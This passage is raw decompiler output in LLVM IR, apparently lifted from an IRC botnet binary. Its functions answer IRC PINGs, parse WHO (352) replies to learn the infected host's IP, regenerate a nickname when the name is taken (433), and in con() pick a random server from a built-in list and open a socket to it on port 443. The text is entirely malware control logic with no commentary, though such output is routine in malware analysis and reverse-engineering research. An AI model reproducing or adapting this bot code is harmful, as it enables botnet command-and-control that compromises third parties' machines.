  br i1 %v6_9900, label %dec_label_pc_991c, label %dec_label_pc_9a0c

dec_label_pc_9910:                                ; preds = %dec_label_pc_9934
  %v1_9914 = add i32 %storemerge17, 1
  br label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_98e8, %dec_label_pc_9910
  %storemerge17 = phi i32 [ %v1_9914, %dec_label_pc_9910 ], [ 0, %dec_label_pc_98e8 ]
  store i32 %v1_98ec, i32* %r0.global-to-local, align 4
  %v3_9924 = call i32 @strlen(i8* %v5_98f0)
  store i32 %v3_9924, i32* %r0.global-to-local, align 4
  %v3_992c = icmp ult i32 %storemerge17, %v3_9924
  br i1 %v3_992c, label %dec_label_pc_9934, label %dec_label_pc_991c.dec_label_pc_9950_crit_edge

dec_label_pc_991c.dec_label_pc_9950_crit_edge:    ; preds = %dec_label_pc_991c
  %.pre30 = add i32 %storemerge17, %v1_98ec
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_9950

dec_label_pc_9934:                                ; preds = %dec_label_pc_991c
  %v2_9940 = add i32 %storemerge17, %v1_98ec
  %v1_9944 = inttoptr i32 %v2_9940 to i8*
  %v2_9944 = load i8, i8* %v1_9944, align 1
  %v7_9948 = icmp eq i8 %v2_9944, 32
  br i1 %v7_9948, label %dec_label_pc_9950, label %dec_label_pc_9910

dec_label_pc_9950:                                ; preds = %dec_label_pc_9934, %dec_label_pc_991c.dec_label_pc_9950_crit_edge
  %v5_99f8.pre-phi = phi i8* [ %.pre31, %dec_label_pc_991c.dec_label_pc_9950_crit_edge ], [ %v1_9944, %dec_label_pc_9934 ]
  %v2_99f4.pre-phi = phi i32 [ %.pre30, %dec_label_pc_991c.dec_label_pc_9950_crit_edge ], [ %v2_9940, %dec_label_pc_9934 ]
  store i32 %stack_var_-28.022, i32* @r4, align 4
  %v1_9958 = add i32 %storemerge17, 1
  store i32 %v1_9958, i32* %r0.global-to-local, align 4
  %v1_9960 = call i32 @malloc(i32 %v1_9958)
  %v0_9970 = load i32, i32* @r4, align 4
  %v3_9970 = mul i32 %v0_9970, 4
  store i32 %v2_97f4, i32* %r0.global-to-local, align 4
  %v2_997c = add i32 %v2_98cc, %v3_9970
  %v2_9980 = inttoptr i32 %v2_997c to i32*
  store i32 %v1_9960, i32* %v2_9980, align 4
  %v3_998c = mul i32 %stack_var_-28.022, 4
  %v2_9998 = add i32 %v2_98cc, %v3_998c
  %v1_999c = inttoptr i32 %v2_9998 to i32*
  %v2_999c = load i32, i32* %v1_999c, align 4
  store i32 %v2_999c, i32* %r0.global-to-local, align 4
  store i32 %v1_98ec, i32* @r1, align 4
  %v3_99ac = call i32 @strncpy(i32 %v2_999c, i32 %v1_98ec, i32 %storemerge17)
  store i32 %v2_97f4, i32* %r0.global-to-local, align 4
  %v2_99c8 = load i32, i32* %v1_999c, align 4
  %v2_99d0 = add i32 %v2_99c8, %storemerge17
  %v3_99d8 = inttoptr i32 %v2_99d0 to i8*
  store i8 0, i8* %v3_99d8, align 1
  %v1_99e0 = add nuw i32 %stack_var_-28.022, 1
  %v2_9a00 = load i8, i8* %v5_99f8.pre-phi, align 1
  %v2_9a04 = icmp eq i8 %v2_9a00, 0
  br i1 %v2_9a04, label %dec_label_pc_9a0c, label %dec_label_pc_98e8

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_9950, %dec_label_pc_98e8, %dec_label_pc_98a8
  %v7_9aec = load i32, i32* bitcast ([5 x i8]** @global_var_231cc.92 to i32*), align 4
  %v2_9af0 = icmp eq i32 %v7_9aec, 0
  br i1 %v2_9af0, label %dec_label_pc_9af8, label %dec_label_pc_9a18

dec_label_pc_9a18:                                ; preds = %dec_label_pc_9a0c
  store i32 %v7_9aec, i32* %r0.global-to-local, align 4
  %v2_9a38 = inttoptr i32 %v7_9aec to i8*
  %v3_9a38 = call i32 @__GI_strcasecmp(i8* %v2_9a38, i32 %v2_96e0)
  store i32 %v3_9a38, i32* %r0.global-to-local, align 4
  %v2_9a60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([5 x i8]** @global_var_231cc.92 to i32), i32 4) to i32*), align 4
  store i32 %v2_9a60, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 39560, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_9a60)
  %v5_9ad068 = icmp sgt i32 %stack_var_-32.2, 1
  br i1 %v5_9ad068, label %dec_label_pc_9a94, label %dec_label_pc_9af8

dec_label_pc_9a94:                                ; preds = %dec_label_pc_9a18, %dec_label_pc_9a94
  %storemerge1669 = phi i32 [ %v1_9abc, %dec_label_pc_9a94 ], [ 1, %dec_label_pc_9a18 ]
  %v3_9a9c = mul i32 %storemerge1669, 4
  %v2_9aa8 = add i32 %v2_98cc, %v3_9a9c
  %v1_9aac = inttoptr i32 %v2_9aa8 to i32*
  %v2_9aac = load i32, i32* %v1_9aac, align 4
  store i32 %v2_9aac, i32* @r0, align 4
  %v0_9ab4 = call i32 @free()
  store i32 %v0_9ab4, i32* %r0.global-to-local, align 4
  %v1_9abc = add nuw nsw i32 %storemerge1669, 1
  %v5_9ad0 = icmp slt i32 %v1_9abc, %stack_var_-32.2
  br i1 %v5_9ad0, label %dec_label_pc_9a94, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9a18, %dec_label_pc_9a94, %dec_label_pc_9a0c, %dec_label_pc_9754, %dec_label_pc_96b8, %dec_label_pc_9690
  %v1_9b00 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_9b00

; uselistorder directives
  uselistorder i32 %v1_9abc, { 1, 0 }
  uselistorder i32 %v7_9aec, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_98ec, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-28.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-32.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v4_97c0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-36.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v2_97f4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %storemerge13, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_9700, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 25, 2, 1, 5, 3, 4, 6, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 26, 24, 28, 27, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_9af8, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_9a94, { 1, 0 }
  uselistorder label %dec_label_pc_991c, { 1, 0 }
  uselistorder label %dec_label_pc_98e8, { 1, 0 }
  uselistorder label %dec_label_pc_98a8, { 1, 0 }
  uselistorder label %dec_label_pc_9870, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9864, { 1, 0 }
  uselistorder label %dec_label_pc_9820, { 1, 0 }
  uselistorder label %dec_label_pc_9720, { 1, 0 }
  uselistorder label %dec_label_pc_965c, { 1, 0 }
  uselistorder label %dec_label_pc_95d8, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39712, i32* %stack_var_-4, align 4
  %v2_9b1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b1c, i32* @fp, align 4
  %v2_9b34 = load i32, i32* @global_var_26534.88, align 4
  %v4_9b44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1977c.95 to i32), i32 %v2_9b34)
  %v2_9b4c = load i32, i32* @global_var_2654c.58, align 4
  %v4_9b60 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1978c.100 to i32), i32 %v2_9b4c)
  %v2_9b68 = load i32, i32* @global_var_26534.88, align 4
  %v4_9b78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1979c.102 to i32), i32 %v2_9b68)
  ret i32 %v4_9b78

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39852, i32* %stack_var_-4, align 4
  %v2_9ba8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ba8, i32* @fp, align 4
  %v4_9bc8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_197a4.104 to i32), i32 %arg3)
  ret i32 %v4_9bc8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 39912, i32* %stack_var_-4, align 4
  %v2_9be4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9be4, i32* @fp, align 4
  br label %dec_label_pc_9c2c.preheader

dec_label_pc_9c14:                                ; preds = %dec_label_pc_9c44
  %v1_9c18 = add i32 %.pre, 1
  %v5_9c1c = inttoptr i32 %v1_9c18 to i8*
  %v1_9c24 = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_9c2c

dec_label_pc_9c2c:                                ; preds = %dec_label_pc_9c2c.preheader, %dec_label_pc_9c14
  %stack_var_-32.0 = phi i8* [ %v5_9c1c, %dec_label_pc_9c14 ], [ %stack_var_-32.117, %dec_label_pc_9c2c.preheader ]
  %stack_var_-40.0 = phi i32 [ %v1_9c24, %dec_label_pc_9c14 ], [ %stack_var_-40.118, %dec_label_pc_9c2c.preheader ]
  %v3_9c34 = call i32 @strlen(i8* %arg3)
  %v3_9c3c = icmp ult i32 %stack_var_-40.0, %v3_9c34
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_9c3c, label %dec_label_pc_9c44, label %dec_label_pc_9c54

dec_label_pc_9c44:                                ; preds = %dec_label_pc_9c2c
  %v2_9c48 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9c4c = icmp eq i8 %v2_9c48, 32
  br i1 %v7_9c4c, label %dec_label_pc_9c54, label %dec_label_pc_9c14

dec_label_pc_9c54:                                ; preds = %dec_label_pc_9c2c, %dec_label_pc_9c44
  %v1_9c58 = add i32 %.pre, 1
  %v3_9c68 = call i32 @strlen(i8* %arg3)
  %v9_9c70 = icmp eq i32 %stack_var_-40.0, %v3_9c68
  br i1 %v9_9c70, label %dec_label_pc_9ef4, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c54
  %v5_9c5c = inttoptr i32 %v1_9c58 to i8*
  %v1_9c7c = add nuw nsw i32 %storemerge719, 1
  %v7_9c8c = icmp slt i32 %v1_9c7c, 5
  br i1 %v7_9c8c, label %dec_label_pc_9c2c.preheader, label %dec_label_pc_9ca8

dec_label_pc_9c2c.preheader:                      ; preds = %entry, %dec_label_pc_9c78
  %storemerge719 = phi i32 [ 0, %entry ], [ %v1_9c7c, %dec_label_pc_9c78 ]
  %stack_var_-40.118 = phi i32 [ 0, %entry ], [ %stack_var_-40.0, %dec_label_pc_9c78 ]
  %stack_var_-32.117 = phi i8* [ %arg3, %entry ], [ %v5_9c5c, %dec_label_pc_9c78 ]
  br label %dec_label_pc_9c2c

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9cc0
  %v1_9ca0 = add i32 %storemerge8, 1
  br label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c78, %dec_label_pc_9c9c
  %storemerge8 = phi i32 [ %v1_9ca0, %dec_label_pc_9c9c ], [ 0, %dec_label_pc_9c78 ]
  store i32 %storemerge8, i32* @r4, align 4
  %v3_9cb0 = call i32 @strlen(i8* %v5_9c5c)
  %v0_9cb8 = load i32, i32* @r4, align 4
  %v3_9cb8 = icmp ult i32 %v0_9cb8, %v3_9cb0
  br i1 %v3_9cb8, label %dec_label_pc_9cc0, label %dec_label_pc_9ca8.dec_label_pc_9cdc_crit_edge

dec_label_pc_9ca8.dec_label_pc_9cdc_crit_edge:    ; preds = %dec_label_pc_9ca8
  %.pre25 = add i32 %storemerge8, %v1_9c58
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_9cdc

dec_label_pc_9cc0:                                ; preds = %dec_label_pc_9ca8
  %v2_9ccc = add i32 %storemerge8, %v1_9c58
  %v1_9cd0 = inttoptr i32 %v2_9ccc to i8*
  %v2_9cd0 = load i8, i8* %v1_9cd0, align 1
  %v7_9cd4 = icmp eq i8 %v2_9cd0, 32
  br i1 %v7_9cd4, label %dec_label_pc_9cdc, label %dec_label_pc_9c9c

dec_label_pc_9cdc:                                ; preds = %dec_label_pc_9cc0, %dec_label_pc_9ca8.dec_label_pc_9cdc_crit_edge
  %v3_9cf0.pre-phi = phi i8* [ %.pre26, %dec_label_pc_9ca8.dec_label_pc_9cdc_crit_edge ], [ %v1_9cd0, %dec_label_pc_9cc0 ]
  store i8 0, i8* %v3_9cf0.pre-phi, align 1
  %v2_9cf8 = load i32, i32* @global_var_26534.88, align 4
  %v4_9d04 = call i32 @__GI_strcasecmp(i8* %v5_9c5c, i32 %v2_9cf8)
  %v2_9d0c = icmp eq i32 %v4_9d04, 0
  br i1 %v2_9d0c, label %dec_label_pc_9d14, label %dec_label_pc_9ef4

dec_label_pc_9d14:                                ; preds = %dec_label_pc_9cdc
  %v2_9d18 = load i32, i32* @global_var_23460.107, align 4
  %v2_9d1c = icmp eq i32 %v2_9d18, 0
  br i1 %v2_9d1c, label %dec_label_pc_9d24, label %dec_label_pc_9ef4

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d14
  br label %dec_label_pc_9d58.preheader

dec_label_pc_9d40:                                ; preds = %dec_label_pc_9d70
  %v1_9d44 = add i32 %.pre27, 1
  %v5_9d48 = inttoptr i32 %v1_9d44 to i8*
  %v1_9d50 = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_9d58

dec_label_pc_9d58:                                ; preds = %dec_label_pc_9d58.preheader, %dec_label_pc_9d40
  %stack_var_-32.2 = phi i8* [ %v5_9d48, %dec_label_pc_9d40 ], [ %stack_var_-32.314, %dec_label_pc_9d58.preheader ]
  %stack_var_-40.2 = phi i32 [ %v1_9d50, %dec_label_pc_9d40 ], [ %stack_var_-40.315, %dec_label_pc_9d58.preheader ]
  %v3_9d60 = call i32 @strlen(i8* %arg3)
  %v3_9d68 = icmp ult i32 %stack_var_-40.2, %v3_9d60
  %.pre27 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_9d68, label %dec_label_pc_9d70, label %dec_label_pc_9d80

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9d58
  %v2_9d74 = load i8, i8* %stack_var_-32.2, align 1
  %v7_9d78 = icmp eq i8 %v2_9d74, 32
  br i1 %v7_9d78, label %dec_label_pc_9d80, label %dec_label_pc_9d40

dec_label_pc_9d80:                                ; preds = %dec_label_pc_9d58, %dec_label_pc_9d70
  %v1_9d84 = add i32 %.pre27, 1
  %v3_9d94 = call i32 @strlen(i8* %arg3)
  %v9_9d9c = icmp eq i32 %stack_var_-40.2, %v3_9d94
  br i1 %v9_9d9c, label %dec_label_pc_9ef4, label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d80
  %v5_9d88 = inttoptr i32 %v1_9d84 to i8*
  %v1_9da8 = add nuw nsw i32 %storemerge916, 1
  %v7_9db8 = icmp slt i32 %v1_9da8, 3
  br i1 %v7_9db8, label %dec_label_pc_9d58.preheader, label %dec_label_pc_9dd4

dec_label_pc_9d58.preheader:                      ; preds = %dec_label_pc_9d24, %dec_label_pc_9da4
  %storemerge916 = phi i32 [ 0, %dec_label_pc_9d24 ], [ %v1_9da8, %dec_label_pc_9da4 ]
  %stack_var_-40.315 = phi i32 [ 0, %dec_label_pc_9d24 ], [ %stack_var_-40.2, %dec_label_pc_9da4 ]
  %stack_var_-32.314 = phi i8* [ %arg3, %dec_label_pc_9d24 ], [ %v5_9d88, %dec_label_pc_9da4 ]
  br label %dec_label_pc_9d58

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9dec
  %v1_9dcc = add i32 %storemerge10, 1
  br label %dec_label_pc_9dd4

dec_label_pc_9dd4:                                ; preds = %dec_label_pc_9da4, %dec_label_pc_9dc8
  %storemerge10 = phi i32 [ %v1_9dcc, %dec_label_pc_9dc8 ], [ 0, %dec_label_pc_9da4 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_9ddc = call i32 @strlen(i8* %v5_9d88)
  %v0_9de4 = load i32, i32* @r4, align 4
  %v3_9de4 = icmp ult i32 %v0_9de4, %v3_9ddc
  br i1 %v3_9de4, label %dec_label_pc_9dec, label %dec_label_pc_9dd4.dec_label_pc_9e08_crit_edge

dec_label_pc_9dd4.dec_label_pc_9e08_crit_edge:    ; preds = %dec_label_pc_9dd4
  %.pre28 = add i32 %storemerge10, %v1_9d84
  %.pre29 = inttoptr i32 %.pre28 to i8*
  br label %dec_label_pc_9e08

dec_label_pc_9dec:                                ; preds = %dec_label_pc_9dd4
  %v2_9df8 = add i32 %storemerge10, %v1_9d84
  %v1_9dfc = inttoptr i32 %v2_9df8 to i8*
  %v2_9dfc = load i8, i8* %v1_9dfc, align 1
  %v7_9e00 = icmp eq i8 %v2_9dfc, 32
  br i1 %v7_9e00, label %dec_label_pc_9e08, label %dec_label_pc_9dc8

dec_label_pc_9e08:                                ; preds = %dec_label_pc_9dec, %dec_label_pc_9dd4.dec_label_pc_9e08_crit_edge
  %v3_9e1c.pre-phi = phi i8* [ %.pre29, %dec_label_pc_9dd4.dec_label_pc_9e08_crit_edge ], [ %v1_9dfc, %dec_label_pc_9dec ]
  store i8 0, i8* %v3_9e1c.pre-phi, align 1
  store i32 %v1_9d84, i32* @r0, align 4
  %v2_9e24 = call i32 @inet_addr(i32 %v1_9d84)
  %v5_9e2c = trunc i32 %v2_9e24 to i8
  store i8 %v5_9e2c, i8* %stack_var_-44, align 1
  %v3_9e34 = icmp eq i8 %v5_9e2c, -1
  br i1 %v3_9e34, label %dec_label_pc_9e3c, label %dec_label_pc_9e98

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9e08
  store i32 %v1_9d84, i32* @r0, align 4
  %v2_9e40 = call i32 @__GI_gethostbyname(i32 %v1_9d84)
  %v2_9e50 = icmp eq i32 %v2_9e40, 0
  br i1 %v2_9e50, label %dec_label_pc_9e58, label %dec_label_pc_9e74

dec_label_pc_9e58:                                ; preds = %dec_label_pc_9e3c
  %v2_9e5c = load i32, i32* @global_var_2654c.58, align 4
  %v4_9e6c = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_197b0.110 to i32), i32 %v2_9e5c)
  br label %dec_label_pc_9ef4

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e3c
  %v1_9e78 = add i32 %v2_9e40, 16
  %v2_9e78 = inttoptr i32 %v1_9e78 to i32*
  %v3_9e78 = load i32, i32* %v2_9e78, align 4
  %v1_9e7c = inttoptr i32 %v3_9e78 to i32*
  %v2_9e7c = load i32, i32* %v1_9e7c, align 4
  store i32 %v2_9e7c, i32* @r1, align 4
  %v1_9e84 = add i32 %v2_9e40, 12
  %v2_9e84 = inttoptr i32 %v1_9e84 to i32*
  %v3_9e84 = load i32, i32* %v2_9e84, align 4
  store i32 %v3_9e84, i32* @r2, align 4
  %v2_9e8c = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_9e8c, i32* @r3, align 4
  store i32 %v2_9e8c, i32* @r0, align 4
  %v0_9e94 = call i32 @memcpy()
  %v2_9ea4.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_9e08, %dec_label_pc_9e74
  %v1_9efc24 = phi i32 [ %v0_9e94, %dec_label_pc_9e74 ], [ %v2_9e24, %dec_label_pc_9e08 ]
  %v2_9ea4 = phi i8 [ %v2_9ea4.pre, %dec_label_pc_9e74 ], [ %v5_9e2c, %dec_label_pc_9e08 ]
  store i8 %v2_9ea4, i8* bitcast (i8** @global_var_2345f.113 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_2345c.112 to i8*), align 4
  store i32 256, i32* @global_var_23460.107, align 4
  br label %dec_label_pc_9ef4

dec_label_pc_9ef4:                                ; preds = %dec_label_pc_9c54, %dec_label_pc_9d80, %dec_label_pc_9d14, %dec_label_pc_9cdc, %dec_label_pc_9e58, %dec_label_pc_9e98
  %v1_9efc = phi i32 [ 0, %dec_label_pc_9d14 ], [ %v4_9d04, %dec_label_pc_9cdc ], [ %v4_9e6c, %dec_label_pc_9e58 ], [ %v1_9efc24, %dec_label_pc_9e98 ], [ %v3_9d94, %dec_label_pc_9d80 ], [ %v3_9c68, %dec_label_pc_9c54 ]
  ret i32 %v1_9efc

; uselistorder directives
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9da8, { 1, 0 }
  uselistorder i32 %v1_9d84, { 3, 2, 5, 4, 0, 1, 6 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9c7c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %arg3, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_9ef4, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9e98, { 1, 0 }
  uselistorder label %dec_label_pc_9dd4, { 1, 0 }
  uselistorder label %dec_label_pc_9d58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9d80, { 1, 0 }
  uselistorder label %dec_label_pc_9ca8, { 1, 0 }
  uselistorder label %dec_label_pc_9c2c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9c54, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40736, i32* %stack_var_-4, align 4
  %v2_9f1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f1c, i32* @fp, align 4
  %v2_9f34 = load i32, i32* @global_var_26534.88, align 4
  store i32 %v2_9f34, i32* @r0, align 4
  %v0_9f3c = call i32 @free()
  %v1_9f48 = call i32 @makestring(i32 %v0_9f3c)
  %v2_9f54 = ptrtoint i32* %stack_var_-74 to i32
  store i32 ptrtoint (i32* @global_var_19810.118 to i32), i32* @r1, align 4
  %v2_9f60 = bitcast i32* %stack_var_-74 to i8*
  %v3_9f60 = call i32 @strcpy(i8* %v2_9f60, i32 ptrtoint (i32* @global_var_19810.118 to i32))
  store i32 %v1_9f48, i32* @r1, align 4
  %v3_9f70 = call i32 @strcat(i8* %v2_9f60, i32 %v1_9f48)
  store i32 %v2_9f54, i32* @global_var_26534.88, align 4
  ret i32 %v3_9f70

; uselistorder directives
  uselistorder i32 %v1_9f48, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9f98 = load i32, i32* @fp, align 4
  store i32 40864, i32* %stack_var_-4, align 4
  %v2_9f9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f9c, i32* @fp, align 4
  %v2_a0cc = ptrtoint i32* %stack_var_-40 to i32
  %v2_a11c = ptrtoint i32* %stack_var_-48 to i32
  %v2_a15c = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9fa4.backedge, %entry
  store i32 -1, i32* @global_var_26538.34, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9fbc = load i32, i32* @global_var_23454.121, align 4
  %v2_9fc0 = icmp eq i32 %v2_9fbc, 0
  br i1 %v2_9fc0, label %dec_label_pc_9fc8, label %dec_label_pc_9ffc

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fa4
  %v0_9fc8 = call i32 @rand()
  %v2_9fd4 = load i32, i32* @global_var_231bc.123, align 4
  %v3_9fe0 = urem i32 %v0_9fc8, %v2_9fd4
  %v4_9ff0 = mul i32 %v3_9fe0, 4
  %v5_9ff0 = add i32 %v4_9ff0, ptrtoint ([14 x i8]** @global_var_231c0.126 to i32)
  %v6_9ff0 = inttoptr i32 %v5_9ff0 to i32*
  %v7_9ff0 = load i32, i32* %v6_9ff0, align 4
  store i32 %v7_9ff0, i32* @global_var_26540.128, align 4
  br label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9fc8
  store i32 0, i32* @global_var_23454.121, align 4
  br label %dec_label_pc_a008

dec_label_pc_a008:                                ; preds = %dec_label_pc_a008, %dec_label_pc_9ffc
  %v3_a014 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_a014, i32* @global_var_26538.34, align 4
  %v1_a02c = icmp slt i32 %v3_a014, 0
  br i1 %v1_a02c, label %dec_label_pc_a008, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a008
  %v2_a038 = load i32, i32* @global_var_26540.128, align 4
  store i32 %v2_a038, i32* @r0, align 4
  %v1_a040 = call i32 @inet_addr(i32 %v2_a038)
  %v2_a048 = icmp eq i32 %v1_a040, 0
  br i1 %v2_a048, label %dec_label_pc_a06c, label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a034
  %v2_a054 = load i32, i32* @global_var_26540.128, align 4
  store i32 %v2_a054, i32* @r0, align 4
  %v1_a05c = call i32 @inet_addr(i32 %v2_a054)
  %v3_a064 = icmp eq i32 %v1_a05c, -1
  br i1 %v3_a064, label %dec_label_pc_a06c, label %dec_label_pc_a0e0

dec_label_pc_a06c:                                ; preds = %dec_label_pc_a050, %dec_label_pc_a034
  %v2_a070 = load i32, i32* @global_var_26540.128, align 4
  store i32 %v2_a070, i32* @r0, align 4
  %v1_a078 = call i32 @__GI_gethostbyname(i32 %v2_a070)
  %v2_a088 = icmp eq i32 %v1_a078, 0
  br i1 %v2_a088, label %dec_label_pc_a090, label %dec_label_pc_a0b0

dec_label_pc_a090:                                ; preds = %dec_label_pc_a06c
  store i32 0, i32* @global_var_26540.128, align 4
  %v2_a0a0 = load i32, i32* @global_var_26538.34, align 4
  %v1_a0a8 = call i32 @__GI___libc_close(i32 %v2_a0a0)
  br label %dec_label_pc_9fa4.backedge

dec_label_pc_9fa4.backedge:                       ; preds = %dec_label_pc_a090, %dec_label_pc_a250
  br label %dec_label_pc_9fa4

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a06c
  %v1_a0b4 = add i32 %v1_a078, 16
  %v2_a0b4 = inttoptr i32 %v1_a0b4 to i32*
  %v3_a0b4 = load i32, i32* %v2_a0b4, align 4
  %v1_a0b8 = inttoptr i32 %v3_a0b4 to i32*
  %v2_a0b8 = load i32, i32* %v1_a0b8, align 4
  %v1_a0c0 = add i32 %v1_a078, 12
  %v2_a0c0 = inttoptr i32 %v1_a0c0 to i32*
  %v3_a0c0 = load i32, i32* %v2_a0c0, align 4
  store i32 %v3_a0c0, i32* @r2, align 4
  store i32 %v2_a0cc, i32* @r3, align 4
  %v3_a0d8 = call i32 @bcopy(i32 %v2_a0b8, i32 %v2_a0cc, i32 %v3_a0c0)
  br label %dec_label_pc_a0f8

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a050
  %v2_a0e4 = load i32, i32* @global_var_26540.128, align 4
  store i32 %v2_a0e4, i32* @r0, align 4
  %v1_a0ec = call i32 @inet_addr(i32 %v2_a0e4)
  store i32 %v1_a0ec, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a0f8

dec_label_pc_a0f8:                                ; preds = %dec_label_pc_a0b0, %dec_label_pc_a0e0
  store i32 2, i32* %stack_var_-44, align 4
  %v1_a108 = call i32 @__GI_htons(i32 443)
  %v2_a118 = load i32, i32* @global_var_26538.34, align 4
  store i32 %v2_a118, i32* @r3, align 4
  %v3_a12c = call i32 @ioctl(i32 %v2_a118, i32 21537, i32 %v2_a11c)
  %v2_a134 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_a230

dec_label_pc_a144:                                ; preds = %dec_label_pc_a230
  %v0_a144 = call i32 @__GI___errno_location()
  %v2_a150 = inttoptr i32 %v0_a144 to i32*
  store i32 0, i32* %v2_a150, align 4
  %v2_a158 = load i32, i32* @global_var_26538.34, align 4
  %v3_a16c = call i32 @__libc_connect(i32 %v2_a158, i32 %v2_a15c, i32 16)
